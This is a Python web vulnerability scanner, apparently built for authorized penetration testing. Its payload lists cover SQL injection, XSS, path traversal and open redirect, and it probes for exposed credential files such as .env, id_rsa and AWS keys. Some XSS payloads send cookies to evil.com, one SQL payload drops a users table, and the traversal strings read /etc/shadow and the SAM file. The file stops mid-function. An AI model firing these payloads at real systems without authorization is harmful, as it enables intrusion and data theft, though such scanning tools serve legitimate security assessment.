#!/usr/bin/env python3
"""
================================================================================
ADVANCED VULNERABILITY ASSESSMENT AND PENETRATION TESTING (VAPT) SCANNER
================================================================================
Author: Cybersecurity Engineer & VAPT Expert
Version: 2.0
License: For authorized security testing only

DISCLAIMER: This tool is intended for authorized security testing only.
            Unauthorized use against systems you don't own or have
            explicit permission to test is illegal.

Features:
- SQL Injection Detection
- Cross-Site Scripting (XSS) Detection  
- Security Headers Analysis
- SSL/TLS Certificate Analysis
- Directory Traversal Detection
- Open Redirect Detection
- Information Disclosure Checks
- CORS Misconfiguration
- Clickjacking Vulnerability
- CSRF Protection Analysis
- Server Version Disclosure
- Sensitive File Detection
- Subdomain Enumeration
- Port Scanning
- CMS Vulnerability Detection
================================================================================
"""

import html
import requests
import urllib3
import re
import socket
import ssl
import json
import time
import hashlib
import base64
import subprocess
import sys
import argparse
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Optional, Set
import warnings

warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI Color Codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Severity Levels
class Severity:
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

class Vulnerability:
    """Class to represent a detected vulnerability"""
    def __init__(self, name: str, severity: str, description: str, 
                 url: str, payload: str = "", recommendation: str = ""):
        self.name = name
        self.severity = severity
        self.description = description
        self.url = url
        self.payload = payload
        self.recommendation = recommendation
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def __str__(self):
        severity_colors = {
            Severity.CRITICAL: Colors.RED,
            Severity.HIGH: Colors.MAGENTA,
            Severity.MEDIUM: Colors.YELLOW,
            Severity.LOW: Colors.BLUE,
            Severity.INFO: Colors.CYAN
        }
        color = severity_colors.get(self.severity, Colors.WHITE)
        return (f"{color}[{self.severity}]{Colors.END} {self.name}\n"
                f"  URL: {self.url}\n"
                f"  Description: {self.description}\n"
                f"  Payload: {self.payload}\n"
                f"  Recommendation: {self.recommendation}")

class VAPTScanner:
    """Main VAPT Scanner Class"""
    
    def __init__(self, target_url: str, timeout: int = 10, 
                 user_agent: str = None, proxy: str = None):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(self.target_url)
        self.domain = self.parsed_url.netloc
        self.timeout = timeout
        self.vulnerabilities: List[Vulnerability] = []
        self.session = requests.Session()
        
        # Configure session
        self.session.verify = False
        self.session.timeout = timeout
        
        # Headers
        self.headers = {
            'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        # Payload Lists
        self._init_payloads()
    
    def _init_payloads(self):
        """Initialize attack payloads"""
        
        # SQL Injection Payloads
        self.sqli_payloads = [
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            "' OR 1=1--", "' OR 1=1/*", "1' OR '1'='1",
            "1' OR 1=1--", "admin'--", "admin'#",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "1; DROP TABLE users--",
            "' AND 1=1--", "' AND 1=2--", "1' AND '1'='1",
            "1' AND '1'='2", "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--", "1' AND SLEEP(5)--",
            "' OR ''='", "' OR 'x'='x", "1 OR 1=1",
            "' OR 1=1 LIMIT 1--", "admin'/*",
            "' UNION SELECT username,password FROM users--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
            "-1' UNION SELECT 1,2,3--", "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        ]
        
        # XSS Payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "javascript:alert('XSS')",
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg/onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<IMG SRC=\"javascript:alert('XSS');\">",
            "<SCRIPT/XSS SRC=\"http://evil.com/xss.js\"></SCRIPT>",
            "<BODY ONLOAD=alert('XSS')>",
            "<BGSOUND SRC=\"javascript:alert('XSS');\">",
            "<BR SIZE=\"&{alert('XSS')}\">",
            "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
        ]
        
        # Directory Traversal Payloads
        self.dir_traversal_payloads = [
            "../../../etc/passwd", "../../../../etc/passwd",
            "../../../../../etc/passwd", "../../../../../../etc/passwd",
            "../etc/passwd", "..%2F..%2F..%2Fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..%5c..%5c..%5cwindows\\system32\\config\\sam",
            "/etc/passwd", "/etc/shadow", "/etc/hosts",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd", "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%255c..%255c..%255cwindows/system32/config/sam",
        ]
        
        # Open Redirect Payloads
        self.open_redirect_payloads = [
            "//evil.com", "https://evil.com",
            "http://evil.com", "//evil.com/path",
            "https://evil.com/path", "http://evil.com/path",
            "//evil%E3%80%82com", "https://evil.com%2F%2E%2E",
            "javascript:alert(document.domain)",
            "data:text/html,<script>alert(1)</script>",
            "///evil.com", "////evil.com",
            "https:evil.com", "http:evil.com",
            "//evil.com/%2F..", "//evil.com/%2e%2e",
            "https://evil.com\\@trusted.com",
            "https://trusted.com@evil.com",
        ]
        
        # Sensitive Files
        self.sensitive_files = [
            "/.env", "/.git/config", "/.git/HEAD", "/.svn/entries",
            "/.htaccess", "/.htpasswd", "/web.config", "/config.php",
            "/wp-config.php", "/configuration.php", "/settings.php",
            "/database.yml", "/credentials.json", "/secrets.yml",
            "/id_rsa", "/id_rsa.pub", "/.ssh/id_rsa",
            "/.aws/credentials", "/.docker/config.json",
            "/robots.txt", "/sitemap.xml", "/.DS_Store",
            "/backup.sql", "/dump.sql", "/database.sql",
            "/phpinfo.php", "/info.php", "/test.php",
            "/server-status", "/server-info", "/.well-known/",
            "/admin", "/administrator", "/wp-admin", "/phpmyadmin",
            "/backup.zip", "/backup.tar.gz", "/backup/",
            "/old/", "/new/", "/temp/", "/tmp/",
            "/api/", "/api/v1/", "/swagger-ui.html", "/api-docs",
            "/.gitignore", "/.dockerignore", "/Dockerfile",
            "/package.json", "/composer.json", "/Gemfile",
            "/crossdomain.xml", "/clientaccesspolicy.xml",
        ]
        
        # Security Headers to Check
        self.security_headers = {
            'X-Frame-Options': {
                'severity': Severity.MEDIUM,
                'recommendation': 'Add X-Frame-Options header with value DENY or SAMEORIGIN to prevent clickjacking attacks.'
            },
            'X-Content-Type-Options': {
                'severity': Severity.MEDIUM,
                'recommendation': 'Add X-Content-Type-Options: nosniff to prevent MIME type sniffing.'
            },
            'X-XSS-Protection': {
                'severity': Severity.LOW,
                'recommendation': 'Add X-XSS-Protection: 1; mode=block header (deprecated but still useful for older browsers).'
            },
            'Content-Security-Policy': {
                'severity': Severity.HIGH,
                'recommendation': 'Implement Content-Security-Policy header to prevent XSS and data injection attacks.'
            },
            'Strict-Transport-Security': {
                'severity': Severity.HIGH,
                'recommendation': 'Add Strict-Transport-Security header to enforce HTTPS connections.'
            },
            'Referrer-Policy': {
                'severity': Severity.LOW,
                'recommendation': 'Add Referrer-Policy header to control referrer information.'
            },
            'Permissions-Policy': {
                'severity': Severity.MEDIUM,
                'recommendation': 'Add Permissions-Policy header to restrict browser features.'
            },
            'Cross-Origin-Opener-Policy': {
                'severity': Severity.MEDIUM,
                'recommendation': 'Add Cross-Origin-Opener-Policy header for cross-origin isolation.'
            },
            'Cross-Origin-Resource-Policy': {
                'severity': Severity.MEDIUM,
                'recommendation': 'Add Cross-Origin-Resource-Policy header to prevent cross-origin leaks.'
            },
        }
    
    def banner(self):
        """Display scanner banner"""
        banner = f"""
{Colors.CYAN}{'='*80}
{Colors.BOLD}   ███████╗ █████╗ ██╗   ██╗ █████╗ ██████╗ ██╗
{Colors.END}{Colors.CYAN}   ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██║
{Colors.END}{Colors.CYAN}   ███████╗███████║ ╚████╔╝ ███████║██████╔╝██║
{Colors.END}{Colors.CYAN}   ╚════██║██╔══██║  ╚██╔╝  ██╔══██║██╔══██╗██║
{Colors.END}{Colors.CYAN}   ███████║██║  ██║   ██║   ██║  ██║██║  ██║██║
{Colors.END}{Colors.CYAN}   ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝
{Colors.END}{Colors.CYAN}{'='*80}
{Colors.GREEN}  Vulnerability Assesment and Penetration Testing (VAPT) Scanner
{Colors.YELLOW}  Created by Dr3amy | For Authorized Use Only
{Colors.CYAN}{'='*80}{Colors.END}
"""
        print(banner)
    
    def log(self, message: str, level: str = "INFO"):
        """Log messages with color coding"""
        colors = {
            "INFO": Colors.BLUE,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "VULN": Colors.MAGENTA
        }
        color = colors.get(level, Colors.WHITE)
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{color}[{timestamp}] [{level}]{Colors.END} {message}")
    
    def add_vulnerability(self, vuln: Vulnerability):
        """Add a vulnerability to the list"""
        self.vulnerabilities.append(vuln)
        self.log(f"Vulnerability Found: {vuln.name} [{vuln.severity}]", "VULN")
    
    def make_request(self, url: str, method: str = "GET", 
                     params: dict = None, data: dict = None,
                     headers: dict = None, allow_redirects: bool = True) -> Optional[requests.Response]:
        """Make HTTP request with error handling"""
        try:
            req_headers = {**self.headers, **(headers or {})}
            response = self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                headers=req_headers,
                timeout=self.timeout,
                allow_redirects=allow_redirects
            )
            return response
        except requests.exceptions.RequestException as e:
            return None
    
    # ================== VULNERABILITY CHECKS ==================
    
    def check_security_headers(self):
        """Check for missing security headers"""
        self.log("Checking security headers...", "INFO")
        
        response = self.make_request(self.target_url)
        if not response:
            self.log("Could not fetch response for security header check", "ERROR")
            return
        
        headers = response.headers
        
        for header, info in self.security_headers.items():
            if header not in headers:
                vuln = Vulnerability(
                    name=f"Missing Security Header: {header}",
                    severity=info['severity'],
                    description=f"The {header} header is missing from the HTTP response. "
                               f"This header helps protect against various attacks and should be implemented.",
                    url=self.target_url,
                    recommendation=info['recommendation']
                )
                self.add_vulnerability(vuln)
        
        # Check for information disclosure in Server header
        if 'Server' in headers:
            server_header = headers['Server']
            if any(version in server_header.lower() for version in ['apache', 'nginx', 'iis', 'tomcat']):
                if re.search(r'[0-9]+\.[0-9]+', server_header):
                    vuln = Vulnerability(
                        name="Server Version Disclosure",
                        severity=Severity.LOW,
                        description=f"The Server header discloses version information: {server_header}. "
                                   f"This information can help attackers identify known vulnerabilities.",
                        url=self.target_url,
                        recommendation="Configure the server to hide version information in the Server header."
                    )
                    self.add_vulnerability(vuln)
        
        # Check X-Powered-By header
        if 'X-Powered-By' in headers:
            vuln = Vulnerability(
                name="Technology Disclosure via X-Powered-By",
                severity=Severity.LOW,
                description=f"X-Powered-By header discloses technology: {headers['X-Powered-By']}. "
                           f"This information aids attackers in targeting specific vulnerabilities.",
                url=self.target_url,
                recommendation="Remove or sanitize the X-Powered-By header from responses."
            )
            self.add_vulnerability(vuln)
    
    def check_ssl_tls(self):
        """Check SSL/TLS configuration"""
        self.log("Checking SSL/TLS configuration...", "INFO")
        
        if self.parsed_url.scheme != 'https':
            vuln = Vulnerability(
                name="HTTPS Not Enforced",
                severity=Severity.HIGH,
                description="The website is accessible over HTTP without HTTPS. "
                           f"All traffic should be encrypted to protect sensitive data in transit.",
                url=self.target_url,
                recommendation="Implement HTTPS and redirect all HTTP traffic to HTTPS. "
                             "Add HSTS header to enforce HTTPS."
            )
            self.add_vulnerability(vuln)
            return
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.domain, 443), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    expiry_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_until_expiry = (expiry_date - datetime.now()).days
                    
                    if days_until_expiry < 0:
                        vuln = Vulnerability(
                            name="SSL Certificate Expired",
                            severity=Severity.CRITICAL,
                            description=f"The SSL certificate has expired on {cert['notAfter']}. "
                                       f"Expired certificates break encryption and user trust.",
                            url=self.target_url,
                            recommendation="Renew the SSL certificate immediately."
                        )
                        self.add_vulnerability(vuln)
                    elif days_until_expiry < 30:
                        vuln = Vulnerability(
                            name="SSL Certificate Expiring Soon",
                            severity=Severity.MEDIUM,
                            description=f"The SSL certificate expires in {days_until_expiry} days. "
                                       f"Plan certificate renewal to avoid service disruption.",
                            url=self.target_url,
                            recommendation="Renew the SSL certificate before it expires."
                        )
                        self.add_vulnerability(vuln)
                    
                    # Check for weak signature algorithms
                    if 'signatureAlgorithm' in cert and 'sha1' in cert['signatureAlgorithm'].lower():
                        vuln = Vulnerability(
                            name="Weak Certificate Signature Algorithm",
                            severity=Severity.MEDIUM,
                            description="The SSL certificate uses SHA-1 signature algorithm which is "
                                       f"considered cryptographically weak and deprecated.",
                            url=self.target_url,
                            recommendation="Obtain a new certificate with SHA-256 or stronger signature algorithm."
                        )
                        self.add_vulnerability(vuln)
                    
                    # Check protocol version
                    version = ssock.version()
                    if version in ['TLSv1', 'TLSv1.1', 'SSLv3']:
                        vuln = Vulnerability(
                            name="Weak TLS Protocol Version",
                            severity=Severity.HIGH,
                            description=f"The server supports weak TLS version: {version}. "
                                       f"These protocols have known vulnerabilities.",
                            url=self.target_url,
                            recommendation="Disable weak TLS versions (SSLv3, TLSv1.0, TLSv1.1) "
                                         "and use TLSv1.2 or TLSv1.3 only."
                        )
                        self.add_vulnerability(vuln)
                    
        except Exception as e:
            self.log(f"SSL/TLS check error: {str(e)}", "WARNING")
    
    def check_sql_injection(self):
        """Check for SQL Injection vulnerabilities"""
        self.log("Testing for SQL Injection vulnerabilities...", "INFO")
        
        # Get the main page first
        response = self.make_request(self.target_url)
        if not response:
            return
        
        # Find forms and parameters
        forms = self._extract_forms(response.text)
        
        # Test URL parameters
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if params:
            for param_name, param_values in params.items():
                self._test_sqli_param(self.target_url, param_name, param_values[0] if param_values else "")
        
        # Test forms
        for form in forms:
            self._test_sqli_form(form)
    
    def _extract_forms(self, html: str) -> List[Dict]:
        """Extract forms from HTML"""
        forms = []
        form_pattern = re.compile(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\'][^>]*>(.*?)</form>', 
                                  re.IGNORECASE | re.DOTALL)
        input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', re.IGNORECASE)
        
        for match in form_pattern.finditer(html):
            action, method, form_content = match.groups()
            inputs = input_pattern.findall(form_content)
            forms.append({
                'action': urljoin(self.target_url, action) if action else self.target_url,
                'method': method.upper(),
                'inputs': inputs
            })
        
        return forms
    
    def _test_sqli_param(self, url: str, param_name: str, original_value: str):
        """Test a URL parameter for SQL injection"""
        for payload in self.sqli_payloads[:15]:  # Limit payloads for speed
            test_url = url.replace(f"{param_name}={original_value}", 
                                   f"{param_name}={original_value}{payload}")
            try:
                response = self.make_request(test_url)
                if response and self._detect_sqli_response(response.text, response.status_code):
                    vuln = Vulnerability(
                        name="SQL Injection",
                        severity=Severity.CRITICAL,
                        description=f"SQL Injection vulnerability detected in parameter '{param_name}'. "
                                   f"The application appears to be vulnerable to SQL injection attacks, "
                                   f"which could allow attackers to read, modify, or delete database data.",
                        url=test_url,
                        payload=payload,
                        recommendation="Use parameterized queries/prepared statements for all database "
                                     "operations. Implement input validation and sanitization."
                    )
                    self.add_vulnerability(vuln)
                    return
            except Exception:
                pass
    
    def _test_sqli_form(self, form: Dict):
        """Test a form for SQL injection"""
        for payload in self.sqli_payloads[:10]:
            data = {inp: payload for inp in form['inputs']}
            try:
                response = self.make_request(form['action'], method=form['method'], data=data)
                if response and self._detect_sqli_response(response.text, response.status_code):
                    vuln = Vulnerability(
                        name="SQL Injection in Form",
                        severity=Severity.CRITICAL,
                        description=f"SQL Injection vulnerability detected in form at {form['action']}. "
                                   f"The form appears to be vulnerable to SQL injection attacks.",
                        url=form['action'],
                        payload=payload,
                        recommendation="Use parameterized queries/prepared statements. "
                                     "Implement proper input validation and sanitization."
                    )
                    self.add_vulnerability(vuln)
                    return
            except Exception:
                pass
    
    def _detect_sqli_response(self, response_text: str, status_code: int) -> bool:
        """Detect SQL injection indicators in response"""
        sqli_indicators = [
            "sql syntax", "mysql_fetch", "ora-", "oracle error",
            "postgresql", "warning: mysql", "mysqli", "pdo",
            "sqlite", "unterminated string", "quoted string not properly terminated",
            "unclosed quotation mark", "syntax error", "ora-01756",
            "incorrect syntax near", "invalid sql", "mysql_num_rows",
            "odbc", "microsoft ole db", "oledb", "jdbc",
            "you have an error in your sql syntax",
        ]
        
        response_lower = response_text.lower()
        for indicator in sqli_indicators:
            if indicator in response_lower:
                return True
        
        return False
    
    def check_xss(self):
        """Check for Cross-Site Scripting vulnerabilities"""
        self.log("Testing for XSS vulnerabilities...", "INFO")
        
        response = self.make_request(self.target_url)
        if not response:
            return
        
        # Extract forms
        forms = self._extract_forms(response.text)
        
        # Test URL parameters
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if params:
            for param_name, param_values in params.items():
                self._test_xss_param(self.target_url, param_name, param_values[0] if param_values else "")
        
        # Test forms
        for form in forms:
            self._test_xss_form(form)
    
    def _test_xss_param(self, url: str, param_name: str, original_value: str):
        """Test URL parameter for XSS"""
        for payload in self.xss_payloads[:15]:
            test_url = url.replace(f"{param_name}={original_value}", 
                                   f"{param_name}={payload}")
            try:
                response = self.make_request(test_url)
                if response and self._detect_xss_response(response.text, payload):
                    vuln = Vulnerability(
                        name="Cross-Site Scripting (XSS)",
                        severity=Severity.HIGH,
                        description=f"Reflected XSS vulnerability detected in parameter '{param_name}'. "
                                   f"Attackers can inject malicious scripts that execute in victims' browsers, "
                                   f"potentially stealing session cookies, credentials, or performing actions on their behalf.",
                        url=test_url,
                        payload=payload,
                        recommendation="Implement proper output encoding/escaping for all user-supplied data. "
                                     "Use Content-Security-Policy header to mitigate XSS impact."
                    )
                    self.add_vulnerability(vuln)
                    return
            except Exception:
                pass
    
    def _test_xss_form(self, form: Dict):
        """Test form for XSS"""
        for payload in self.xss_payloads[:10]:
            data = {inp: payload for inp in form['inputs']}
            try:
                response = self.make_request(form['action'], method=form['method'], data=data)
                if response and self._detect_xss_response(response.text, payload):
                    vuln = Vulnerability(
                        name="Cross-Site Scripting (XSS) in Form",
                        severity=Severity.HIGH,
                        description=f"Reflected XSS vulnerability detected in form at {form['action']}. "
                                   f"Attackers can inject malicious scripts through this form.",
                        url=form['action'],
                        payload=payload,
                        recommendation="Implement proper output encoding/escaping. "
                                     "Use Content-Security-Policy header."
                    )
                    self.add_vulnerability(vuln)
                    return
            except Exception:
                pass
    
    def _detect_xss_response(self, response_text: str, payload: str) -> bool:
        """Detect XSS payload in response"""
        # Check if payload is reflected without proper encoding
        if payload in response_text:
            return True
        
        # Check for unescaped special characters
        decoded_payload = payload.replace('&lt;', '<').replace('&gt;', '>')
        if decoded_payload in response_text and '<' in decoded_payload:
            return True
        
        return False
    
    def check_directory_traversal(self):
        """Check for Directory Traversal vulnerabilities"""
        self.log("Testing for Directory Traversal vulnerabilities...", "INFO")
        
        response = self.make_request(self.target_url)
        if not response:
            return
        
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if params:
            for param_name, param_values in params.items():
                self._test_traversal_param(self.target_url, param_name, 
                                           param_values[0] if param_values else "")
    
    def _test_traversal_param(self, url: str, param_name: str, original_value: str):
        """Test parameter for directory traversal"""
        for payload in self.dir_traversal_payloads:
            test_url = url.replace(f"{param_name}={original_value}", 
                                   f"{param_name}={payload}")
            try:
                response = self.make_request(test_url)
                if response and self._detect_traversal_response(response.text):
                    vuln = Vulnerability(
                        name="Directory/Path Traversal",
                        severity=Severity.CRITICAL,
                        description=f"Directory Traversal vulnerability detected in parameter '{param_name}'. "
                                   f"Attackers can read arbitrary files from the server, potentially accessing "
                                   f"sensitive configuration files, source code, or credentials.",
                        url=test_url,
                        payload=payload,
                        recommendation="Validate and sanitize all file path inputs. "
                                     "Use allowlists for acceptable file paths. "
                                     "Implement proper access controls on file system operations."
                    )
                    self.add_vulnerability(vuln)
                    return
            except Exception:
                pass
    
    def _detect_traversal_response(self, response_text: str) -> bool:
        """Detect directory traversal indicators"""
        traversal_indicators = [
            "root:", "root:x:", "[boot loader]", "[fonts]",
            "[extensions]", "daemon:", "nobody:", "www-data:",
            "mysql:", "postgres:", "bin:", "mail:", "# /etc/passwd",
            "mailto:", "/bin/bash", "/bin/sh", "Permission denied",
            "No such file or directory", "The system cannot find the",
        ]
        
        for indicator in traversal_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def check_open_redirect(self):
        """Check for Open Redirect vulnerabilities"""
        self.log("Testing for Open Redirect vulnerabilities...", "INFO")
        
        # Common redirect parameter names
        redirect_params = ['url', 'redirect', 'next', 'return', 'returnUrl', 
                          'return_url', 'goto', 'target', 'dest', 'destination',
                          'redir', 'redirect_uri', 'continue', 'callback',
                          'out', 'link', 'src', 'source', 'forward']
        
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        # Test existing parameters
        for param_name, param_values in params.items():
            if any(redirect in param_name.lower() for redirect in redirect_params):
                self._test_redirect_param(self.target_url, param_name)
        
        # Test common redirect parameters
        for param in redirect_params:
            test_url = f"{self.target_url}?{param}=https://evil.com"
            self._test_redirect_param(test_url, param)
    
    def _test_redirect_param(self, url: str, param_name: str):
        """Test parameter for open redirect"""
        for payload in self.open_redirect_payloads:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if param_name in params:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                
                try:
                    response = self.make_request(test_url, allow_redirects=False)
                    if response and self._detect_open_redirect(response, payload):
                        vuln = Vulnerability(
                            name="Open Redirect",
                            severity=Severity.MEDIUM,
                            description=f"Open Redirect vulnerability detected in parameter '{param_name}'. "
                                       f"Attackers can use this to redirect users to malicious websites, "
                                       f"facilitating phishing attacks and bypassing security checks.",
                            url=test_url,
                            payload=payload,
                            recommendation="Implement allowlists for permitted redirect URLs. "
                                         "Use relative URLs for internal redirects. "
                                         "Validate redirect targets against a list of allowed domains."
                        )
                        self.add_vulnerability(vuln)
                        return
                except Exception:
                    pass
    
    def _detect_open_redirect(self, response: requests.Response, payload: str) -> bool:
        """Detect open redirect in response"""
        # Check for redirect status codes
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '')
            if 'evil.com' in location or payload in location:
                return True
        
        # Check for JavaScript redirects
        js_redirect_patterns = [
            f'window.location.*{payload}',
            f'window.location.href.*{payload}',
            f'document.location.*{payload}',
        ]
        
        for pattern in js_redirect_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        return False
    
    def check_sensitive_files(self):
        """Check for exposed sensitive files"""
        self.log("Testing for exposed sensitive files...", "INFO")
        
        def check_file(path):
            url = f"{self.target_url}{path}"
            try:
                response = self.make_request(url)
                if response and response.status_code == 200:
                    # Additional validation for certain files
                    if self._validate_sensitive_file(path, response.text):
                        return path, url, len(response.content)
            except Exception:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_file, path) for path in self.sensitive_files]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    path, url, size = result
                    
                    # Determine severity based on file type
                    if any(x in path for x in ['.env', 'credentials', 'secrets', 'id_rsa', 'password', 'config.php', 'wp-config']):
                        severity = Severity.CRITICAL
                    elif any(x in path for x in ['.git', '.svn', 'backup', 'dump', 'sql']):
                        severity = Severity.HIGH
                    else:
                        severity = Severity.MEDIUM
                    
                    vuln = Vulnerability(
                        name=f"Exposed Sensitive File: {path}",
                        severity=severity,
                        description=f"A sensitive file is publicly accessible at {path}. "
                                   f"Exposing this file could leak sensitive information including "
                                   f"credentials, source code, or configuration details.",
                        url=url,
                        recommendation="Remove or restrict access to this file. "
                                     "Configure web server to deny access to sensitive files and directories. "
                                     "Add appropriate rules to .htaccess or web server configuration."
                    )
                    self.add_vulnerability(vuln)
    
    def _validate_sensitive_file(self, path: str, content: str) -> bool:
        """Validate if sensitive file content is genuine"""
        if not content or len(content) < 10:
            return False
        
        path_lower = path.lower()
        
        if '.git/config' in path_lower:
            return '[core]' in content or '[remote' in content
        
        if '.env' in path_lower:
            return '=' in content and any(key in content.lower() for key in 
                                          ['password', 'secret', 'key', 'token', 'db_', 'api_', 'mail'])
        
        if 'phpinfo' in path_lower or 'info.php' in path_lower:
            return 'php version' in content.lower() or 'phpinfo()' in content.lower()
        
        if 'passwd' in path_lower:
            return 'root:' in content or '/bin/bash' in content
        
        if 'robots.txt' in path_lower:
            return 'user-agent' in content.lower() or 'disallow' in content.lower()
        
        return True
    
    def check_cors(self):
        """Check for CORS misconfiguration"""
        self.log("Testing CORS configuration...", "INFO")
        
        malicious_origins = [
            'https://evil.com',
            'https://attacker.com',
            f'https://{self.domain}.evil.com',
            'https://evil{self.domain}',
            'null',
        ]
        
        for origin in malicious_origins:
            try:
                headers = {'Origin': origin}
                response = self.make_request(self.target_url, headers=headers)
                
                if response:
                    acao = response.headers.get('Access-Control-Allow-Origin', '')
                    acac = response.headers.get('Access-Control-Allow-Credentials', '')
                    
                    # Vulnerability if origin is reflected with credentials allowed
                    if acao == origin or acao == '*':
                        if acac == 'true' or acao == '*':
                            vuln = Vulnerability(
                                name="CORS Misconfiguration",
                                severity=Severity.HIGH if acac == 'true' else Severity.MEDIUM,
                                description=f"CORS misconfiguration detected. The server accepts the origin "
                                           f"'{origin}' and {'allows credentials' if acac == 'true' else 'allows any origin'}. "
                                           f"This could allow attackers to steal sensitive user data.",
                                url=self.target_url,
                                payload=f"Origin: {origin}",
                                recommendation="Configure CORS to only allow trusted origins. "
                                             "Never use Access-Control-Allow-Origin: * with credentials. "
                                             "Validate and whitelist allowed origins explicitly."
                            )
                            self.add_vulnerability(vuln)
                            return
            except Exception:
                pass
    
    def check_clickjacking(self):
        """Check for Clickjacking vulnerability"""
        self.log("Testing for Clickjacking vulnerability...", "INFO")
        
        response = self.make_request(self.target_url)
        if not response:
            return
        
        x_frame_options = response.headers.get('X-Frame-Options', '').upper()
        csp = response.headers.get('Content-Security-Policy', '')
        
        # Check if framing is allowed
        vulnerable = False
        
        if not x_frame_options and 'frame-ancestors' not in csp.lower():
            vulnerable = True
        elif x_frame_options == 'ALLOW-FROM':
            vulnerable = True
        elif x_frame_options and x_frame_options not in ['DENY', 'SAMEORIGIN']:
            vulnerable = True
        
        if vulnerable:
            vuln = Vulnerability(
                name="Clickjacking Vulnerability",
                severity=Severity.MEDIUM,
                description="The application can be embedded in frames/iframes from other domains. "
                           f"This allows attackers to perform clickjacking attacks where users are tricked "
                           f"into clicking on concealed elements.",
                url=self.target_url,
                recommendation="Add X-Frame-Options header with value DENY or SAMEORIGIN. "
                             "Alternatively, use Content-Security-Policy with frame-ancestors directive."
            )
            self.add_vulnerability(vuln)
    
    def check_csrf(self):
        """Check for CSRF protection"""
        self.log("Testing CSRF protection...", "INFO")
        
        response = self.make_request(self.target_url)
        if not response:
            return
        
        forms = self._extract_forms(response.text)
        
        for form in forms:
            if form['method'] == 'POST':
                # Check for CSRF tokens
                has_csrf_token = False
                csrf_indicators = ['csrf', 'token', '_token', 'authenticity_token', 
                                  'nonce', '__requestverificationtoken']
                
                for inp in form['inputs']:
                    if any(indicator in inp.lower() for indicator in csrf_indicators):
                        has_csrf_token = True
                        break
                
                if not has_csrf_token:
                    vuln = Vulnerability(
                        name="Missing CSRF Protection",
                        severity=Severity.MEDIUM,
                        description=f"Form at {form['action']} appears to lack CSRF protection. "
